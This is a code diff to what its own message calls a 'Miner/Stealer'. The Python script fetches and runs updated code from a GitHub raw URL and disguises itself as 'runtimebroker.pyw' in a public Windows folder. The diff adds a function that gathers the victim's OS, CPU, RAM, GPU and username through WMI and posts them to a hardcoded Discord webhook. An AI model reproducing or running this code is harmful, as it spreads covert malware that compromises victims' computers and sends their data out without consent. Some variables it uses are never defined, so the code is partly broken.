@@ -1,8 +1,8 @@
 try:
-    import os, sys, http.client as httplib, urllib.request, time, requests
+    import os, sys, http.client as httplib, urllib.request, time, requests,wmi
 except ImportError:
     pyd = str(sys.executable)
-    os.system(pyd + " -m pip install -r C:/Users/Public/Documents/requirements.txt")
+    os.system(pyd + " -m pip install -r C:/Users/Public/Documents/Benjamin/requirements.txt")
 
 rawrepo = "https://raw.githubusercontent.com/benjaminloir/super-duper-broccoli"
 pd = 'C:/Users/Public/Documents/Benjamin'
@@ -28,6 +28,25 @@ def setup():
     os.popen("{}/runtimebroker.pyw".format(pd))
     os._exit(1)
     
+    
+def simplog():
+    computer = wmi.WMI()
+    computer_info = computer.Win32_ComputerSystem()[0]
+    os_info = computer.Win32_OperatingSystem()[0]
+    proc_info = computer.Win32_Processor()[0]
+
+    os_name = os_info.Name.encode('utf-8').split(b'|')[0]
+    os_version = ' '.join([os_info.Version, os_info.BuildNumber])
+    system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
+  
+    data = {
+        "content" : "**Miner/Stealer Updated.**\n```> OS Name: {}\n> OS Version: {}\n> CPU: {}\n> RAM: {} GB\n> Graphics Card-1: {}\n> Graphics Card-2: {}```".format(os_name, os_version, proc_info.Name, system_ram, gpu.Name, gpu0.Name),
+        "username" : "{}".format(computer_info.Username)
+        }         
+    requests.post("https://discord.com/api/webhooks/1032678220287442975/fzP0Nc3F2QrPqNcA-Jb-whD1fGJFNZdd4aL70lyg3DOhqJJ3Mp3McH1q3vly4GAQqqTu", json = data)
+    time.sleep(3)
+
+    
 def checkupdate():
     r = requests.get(rawrepo + "/main/version")
     gitver = r.text
@@ -37,6 +56,7 @@ def checkupdate():
         urllib.request.urlretrieve(rawrepo + '/main/areureal.py', '{}/runtimebroker.pyw'.format(pd))
         urllib.request.urlretrieve(rawrepo + '/main/requirements.txt', '{}/requirements.txt'.format(pd))
         urllib.request.urlretrieve(rawrepo + '/main/version', '{}/version'.format(pd))
+        simplog()
         os.popen("{}/runtimebroker.pyw".format(pd))
         os._exit(1)
     else:
